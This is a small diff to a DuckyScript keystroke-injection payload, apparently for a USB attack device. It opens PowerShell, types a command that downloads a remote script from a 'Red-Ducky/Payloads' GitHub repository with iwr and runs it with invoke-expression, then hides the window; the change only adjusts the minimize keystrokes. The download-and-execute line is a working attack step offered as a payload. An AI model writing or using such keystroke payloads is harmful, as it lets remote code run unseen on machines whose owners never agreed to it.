@@ -5,4 +5,6 @@ STRINGLN powershell
 DELAY 1500
 STRINGLN $pl = iwr https://raw.githubusercontent.com/Red-Ducky/Payloads/main/Popups/payload.ps1; invoke-expression $pl
 STRINGLN O
-ALT SPACE N
+GBDELAY 0
+ALT SPACE
+STRING N
